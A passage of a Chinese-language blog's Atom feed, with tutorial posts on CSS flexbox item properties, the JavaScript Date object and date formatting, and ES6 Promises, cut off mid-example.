&lt;integer&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-grow</p><p><strong>flex-grow 属性定义项目的放大比例，默认为 0，即如果存在剩余空间，也不放大。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间（如果有的话）。如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍</em></p></li><li><p>flex-shrink</p><p><strong>flex-shrink 属性定义了项目的缩小比例，默认为 1，即如果空间不足，该项目将缩小。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 1 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。负值对该属性无效。</em></p></li><li><p>flex-basis</p><p><strong>flex-basis 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为 auto，即项目的本来大小。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default auto */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>它可以设为跟 width 或 height 属性一样的值（比如 350px），则项目将占据固定空间。</em></p></li><li><p>flex</p><p><strong>flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。后两个属性可选。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: none | [ &lt; <span class="string">"flex-grow"</span> &gt; &lt; <span class="string">"flex-shrink"</span> &gt;? || &lt; <span class="string">"flex-basis"</span> &gt; ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</em></p></li><li><p>align-self</p><p><strong>align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>该属性可能取 6 个值，除了 auto，其他都与 align-items 属性完全一致。</em></p></li></ol><p><a href="https://www.runoob.com/w3cnote/flex-grammar.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/flex-grammar.html</a><br>（完）</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flex布局&lt;br&gt;Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CSS" scheme="https://jiuylq.github.io/categories/CSS/"/>
    
    
      <category term="CSS" scheme="https://jiuylq.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>js-date</title>
    <link href="https://jiuylq.github.io/2018/01/07/js-date/"/>
    <id>https://jiuylq.github.io/2018/01/07/js-date/</id>
    <published>2018-01-07T07:51:28.000Z</published>
    <updated>2018-10-19T12:57:32.776Z</updated>
    
    <content type="html"><![CDATA[<p>唉，最近越来越懒了，博客拖更了。<br>今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="一、日期对象"><a href="#一、日期对象" class="headerlink" title="一、日期对象"></a>一、日期对象</h2><blockquote><p>在javascript中并没有日期型的数据类型，但是提供了一个日期对象可以操作日期和时间。<br>日期对象的创建：<br>new Date();  </p></blockquote><h2 id="二、将日期对象转换为字符串"><a href="#二、将日期对象转换为字符串" class="headerlink" title="二、将日期对象转换为字符串"></a>二、将日期对象转换为字符串</h2><blockquote><p>将日期对象转换为字符串可以使用以下4种方法：<br>date.toString();//将日期对象转换为字符串时，采用的是本地时间<br>date.toLocalString();//将日期对象转换为字符串，采用的是本地时间，显示的是地方日期的格式<br>date.toUTCString();//将日期对象转换为字符串时，采用的是世界时间。<br>date.toGMTString();//将日期对象转换为字符串时，采用的是GMT时间，但是已被禁止使用，一般用toUTCString()方法来替换。</p></blockquote><h2 id="三、将日期对象中的日期和时间转换为字符串"><a href="#三、将日期对象中的日期和时间转换为字符串" class="headerlink" title="三、将日期对象中的日期和时间转换为字符串"></a>三、将日期对象中的日期和时间转换为字符串</h2><blockquote><p>date.toDateString();//将日期部分转换为字符串，本地时间<br>date.toLocalDateString();//将日期部分转换为字符串，采用的是本地时间，显示的是地方日期的格式<br>date.toTimeString();//将时间部分转换为字符串，本地时间<br>date.toLocalTimeString();将时间部分转换为字符串，采用的是本地时间，显示的是地方日期的格式</p></blockquote><h2 id="四、日期对象中的日期"><a href="#四、日期对象中的日期" class="headerlink" title="四、日期对象中的日期"></a>四、日期对象中的日期</h2><blockquote><p>date.getYear();//获取年份，但不建议使用。<br>date.getFullYear();//获取年份，，以四位数显式，建议使用<br>date.getMonth();//获取月份，值为0-11，一月份为0，二月份为1…<br>date.getDate();//获取天数，即一个月中的某一天<br>date.getDay();//获取一周中的第几天，值为0-6，周日为0…</p></blockquote><h2 id="五、日期对象中的时间"><a href="#五、日期对象中的时间" class="headerlink" title="五、日期对象中的时间"></a>五、日期对象中的时间</h2><blockquote><p>date.getHours();//返回小时部分<br>date.getMinutes();//返回分钟部分<br>date.getSeconds();//返回秒钟部分<br>date.getMilliseconds();//返回毫秒部分<br>date.getTime();//返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.getTimezoneoffset();//返回日期对象中的时间与UTC之间的时差数，单位为秒。</p></blockquote><h2 id="六、设置日期对象中的日期e"><a href="#六、设置日期对象中的日期e" class="headerlink" title="六、设置日期对象中的日期e"></a>六、设置日期对象中的日期e</h2><blockquote><p>date.setYear(year);//不建议使用<br>date.setFullYear(year,month,day);//year四位数;month：0-11，该参数可省略;day：1-31， 该参数可省略<br>date.setMonth(month,day);//month：0-11;day：1-31， 该参数可省略<br>date.getDate(day);//day：1-31</p></blockquote><h2 id="七、设置日期对象中的时间"><a href="#七、设置日期对象中的时间" class="headerlink" title="七、设置日期对象中的时间"></a>七、设置日期对象中的时间</h2><blockquote><p>date.getHours(hours,minutes,seconds,milliseconds);//hours:0-23,minutes:0-59,可省略，seconds:0-59,可省略milliseconds:0-999，可省略<br>date.getMinutes(minutes,seconds,milliseconds);//minutes:0-59,seconds:0-59,可省略milliseconds:0-999，可省略<br>date.getSeconds(seconds,milliseconds);// seconds:0-59,milliseconds:0-999，可省略<br>date.getMilliseconds(milliseconds);//,milliseconds:0-999</p></blockquote><h2 id="八、与毫秒相关的方法"><a href="#八、与毫秒相关的方法" class="headerlink" title="八、与毫秒相关的方法"></a>八、与毫秒相关的方法</h2><blockquote><p>date.setTime(millisecinds);milliseconds代表设置的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.valueOf();返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.parse(str);返回str参数所代表的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.UTC(year,month,day,hours,minutes,seconds,milliseconds);将参数所代表的日期转换成与1970年1月1日0时0分0秒所间隔的毫秒数</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a><em>实例</em></h3><p>1、获取时间截<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一</span></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();   <span class="comment">//new Date("2012/7/25 20:11:11").getTime()</span></span><br><span class="line"><span class="comment">//二</span></span><br><span class="line"><span class="keyword">var</span> timestamp = (<span class="keyword">new</span> <span class="built_in">Date</span>()).valueOf()</span><br><span class="line"><span class="comment">// 三</span></span><br><span class="line"><span class="keyword">var</span> timestamp = +<span class="keyword">new</span> <span class="built_in">Date</span>()  <span class="comment">//相当于ToNumber(new Date())</span></span><br><span class="line"><span class="comment">// 四</span></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="built_in">Date</span>.now()</span><br></pre></td></tr></table></figure></p><p>2、格式化时间<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法：var val=new Date("2012/7/25 20:11:11").getTime() var crtTime = new Date(val); dateFtt("yyyy-MM-dd q hh:mm:ss",crtTime);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dateFtt</span>(<span class="params">fmt,date</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> o = &#123;   </span><br><span class="line">    <span class="string">"M+"</span> : date.getMonth()+<span class="number">1</span>,                 <span class="comment">//月份   </span></span><br><span class="line">    <span class="string">"d+"</span> : date.getDate(),                    <span class="comment">//日   </span></span><br><span class="line">    <span class="string">"h+"</span> : date.getHours(),                   <span class="comment">//小时   </span></span><br><span class="line">    <span class="string">"m+"</span> : date.getMinutes(),                 <span class="comment">//分   </span></span><br><span class="line">    <span class="string">"s+"</span> : date.getSeconds(),                 <span class="comment">//秒   </span></span><br><span class="line">    <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((date.getMonth()+<span class="number">3</span>)/<span class="number">3</span>), <span class="comment">//季度   </span></span><br><span class="line">    <span class="string">"S"</span>  : date.getMilliseconds()             <span class="comment">//毫秒   </span></span><br><span class="line">&#125;;   </span><br><span class="line"><span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(fmt))   </span><br><span class="line">    fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (date.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));   </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> o)   </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(fmt))   </span><br><span class="line">fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length)));   </span><br><span class="line"><span class="keyword">return</span> fmt;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* * 对Date的扩展，将 Date 转化为指定格式的String * 月(M)、日(d)、12小时(h)、24小时(H)、分(m)、秒(s)、周(E)、季度(q)</span></span><br><span class="line"><span class="comment">    可以用 1-2 个占位符 * 年(y)可以用 1-4 个占位符，毫秒(S)只能用 1 个占位符(是 1-3 位的数字) * eg: * (new</span></span><br><span class="line"><span class="comment">    Date()).pattern("yyyy-MM-dd hh:mm:ss.S")==&gt; 2006-07-02 08:09:04.423      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd E HH:mm:ss") ==&gt; 2009-03-10 二 20:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd EE hh:mm:ss") ==&gt; 2009-03-10 周二 08:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd EEE hh:mm:ss") ==&gt; 2009-03-10 星期二 08:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-M-d h:m:s.S") ==&gt; 2006-7-2 8:9:4.18      </span></span><br><span class="line"><span class="comment"> */</span>        </span><br><span class="line"><span class="built_in">Date</span>.prototype.pattern=<span class="function"><span class="keyword">function</span>(<span class="params">fmt</span>) </span>&#123;         </span><br><span class="line">    <span class="keyword">var</span> o = &#123;         </span><br><span class="line">    <span class="string">"M+"</span> : <span class="keyword">this</span>.getMonth()+<span class="number">1</span>, <span class="comment">//月份         </span></span><br><span class="line">    <span class="string">"d+"</span> : <span class="keyword">this</span>.getDate(), <span class="comment">//日         </span></span><br><span class="line">    <span class="string">"h+"</span> : <span class="keyword">this</span>.getHours()%<span class="number">12</span> == <span class="number">0</span> ? <span class="number">12</span> : <span class="keyword">this</span>.getHours()%<span class="number">12</span>, <span class="comment">//小时         </span></span><br><span class="line">    <span class="string">"H+"</span> : <span class="keyword">this</span>.getHours(), <span class="comment">//小时         </span></span><br><span class="line">    <span class="string">"m+"</span> : <span class="keyword">this</span>.getMinutes(), <span class="comment">//分         </span></span><br><span class="line">    <span class="string">"s+"</span> : <span class="keyword">this</span>.getSeconds(), <span class="comment">//秒         </span></span><br><span class="line">    <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.getMonth()+<span class="number">3</span>)/<span class="number">3</span>), <span class="comment">//季度         </span></span><br><span class="line">    <span class="string">"S"</span> : <span class="keyword">this</span>.getMilliseconds() <span class="comment">//毫秒         </span></span><br><span class="line">    &#125;;         </span><br><span class="line">    <span class="keyword">var</span> week = &#123;         </span><br><span class="line">    <span class="string">"0"</span> : <span class="string">"\u65e5"</span>,         </span><br><span class="line">    <span class="string">"1"</span> : <span class="string">"\u4e00"</span>,         </span><br><span class="line">    <span class="string">"2"</span> : <span class="string">"\u4e8c"</span>,         </span><br><span class="line">    <span class="string">"3"</span> : <span class="string">"\u4e09"</span>,         </span><br><span class="line">    <span class="string">"4"</span> : <span class="string">"\u56db"</span>,         </span><br><span class="line">    <span class="string">"5"</span> : <span class="string">"\u4e94"</span>,         </span><br><span class="line">    <span class="string">"6"</span> : <span class="string">"\u516d"</span>        </span><br><span class="line">    &#125;;         </span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(fmt))&#123;         </span><br><span class="line">        fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="keyword">this</span>.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/(E+)/</span>.test(fmt))&#123;         </span><br><span class="line">        fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, ((<span class="built_in">RegExp</span>.$<span class="number">1.</span>length&gt;<span class="number">1</span>) ? (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length&gt;<span class="number">2</span> ? <span class="string">"\u661f\u671f"</span> : <span class="string">"\u5468"</span>) : <span class="string">""</span>)+week[<span class="keyword">this</span>.getDay()+<span class="string">""</span>]);         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> o)&#123;         </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(fmt))&#123;         </span><br><span class="line">            fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length)));         </span><br><span class="line">        &#125;         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">return</span> fmt;         </span><br><span class="line">&#125;       </span><br><span class="line">     </span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();      </span><br><span class="line"><span class="built_in">window</span>.alert(date.pattern(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>));</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;唉，最近越来越懒了，博客拖更了。&lt;br&gt;今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="js" scheme="https://jiuylq.github.io/categories/js/"/>
    
    
      <category term="js-date" scheme="https://jiuylq.github.io/tags/js-date/"/>
    
  </entry>
  
  <entry>
    <title>Promise</title>
    <link href="https://jiuylq.github.io/2018/01/03/promise/"/>
    <id>https://jiuylq.github.io/2018/01/03/promise/</id>
    <published>2018-01-03T14:35:37.000Z</published>
    <updated>2018-02-03T14:04:12.635Z</updated>
    
    <content type="html"><![CDATA[<p>  ES6 Promise对象讲解及其用法！<br><a id="more"></a></p><the rest of contents | 余下全文><h1 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h1><h2 id="Promise-的含义"><a href="#Promise-的含义" class="headerlink" title="Promise 的含义"></a>Promise 的含义</h2><p>Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言标准，统一了用法，原生提供了<code>Promise</code>对象。</p><p>所谓<code>Promise</code>，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。</p><p><code>Promise</code>对象有以下两个特点。</p><p>（1）对象的状态不受外界影响。<code>Promise</code>对象代表一个异步操作，有三种状态：<code>pending</code>（进行中）、<code>fulfilled</code>（已成功）和<code>rejected</code>（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是<code>Promise</code>这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。</p><p>（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。<code>Promise</code>对象的状态改变，只有两种可能：从<code>pending</code>变为<code>fulfilled</code>和从<code>pending</code>变为<code>rejected</code>。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对<code>Promise</code>对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。</p><p>注意，为了行文方便，本章后面的<code>resolved</code>统一只指<code>fulfilled</code>状态，不包含<code>rejected</code>状态。</p><p>有了<code>Promise</code>对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，<code>Promise</code>对象提供统一的接口，使得控制异步操作更加容易。</p><p><code>Promise</code>也有一些缺点。首先，无法取消<code>Promise</code>，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，<code>Promise</code>内部抛出的错误，不会反应到外部。第三，当处于<code>pending</code>状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。</p><p>如果某些事件不断地反复发生，一般来说，使用 <a href="https://nodejs.org/api/stream.html" target="_blank" rel="noopener">Stream</a> 模式是比部署<code>Promise</code>更好的选择。</p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>ES6 规定，<code>Promise</code>对象是一个构造函数，用来生成<code>Promise</code>实例。</p><p>下面代码创造了一个<code>Promise</code>实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... some code</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* 异步操作成功 */</span>)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。</p><p><code>resolve</code>函数的作用是，将<code>Promise</code>对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；<code>reject</code>函数的作用是，将<code>Promise</code>对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p><p><code>Promise</code>实例生成以后，可以用<code>then</code>方法分别指定<code>resolved</code>状态和<code>rejected</code>状态的回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// success</span></span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// failure</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>then</code>方法可以接受两个回调函数作为参数。第一个回调函数是<code>Promise</code>对象的状态变为<code>resolved</code>时调用，第二个回调函数是<code>Promise</code>对象的状态变为<code>rejected</code>时调用。其中，第二个函数是可选的，不一定要提供。这两个函数都接受<code>Promise</code>对象传出的值作为参数。</p><p>下面是一个<code>Promise</code>对象的简单例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, ms, <span class="string">'done'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timeout(<span class="number">100</span>).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>timeout</code>方法返回一个<code>Promise</code>实例，表示一段时间以后才会发生的结果。过了指定的时间（<code>ms</code>参数）以后，<code>Promise</code>实例的状态变为<code>resolved</code>，就会触发<code>then</code>方法绑定的回调函数。</p><p>Promise 新建后就会立即执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Promise'</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'resolved.'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Hi!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"><span class="comment">// resolved</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 新建后立即执行，所以首先输出的是<code>Promise</code>。然后，<code>then</code>方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以<code>resolved</code>最后输出。</p><p>下面是异步加载图片的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadImageAsync</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">    image.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      resolve(image);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Could not load image at '</span> + url));</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    image.src = url;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，使用<code>Promise</code>包装了一个图片加载的异步操作。如果加载成功，就调用<code>resolve</code>方法，否则就调用<code>reject</code>方法。</p><p>下面是一个用<code>Promise</code>对象实现的 Ajax 操作的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getJSON = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span 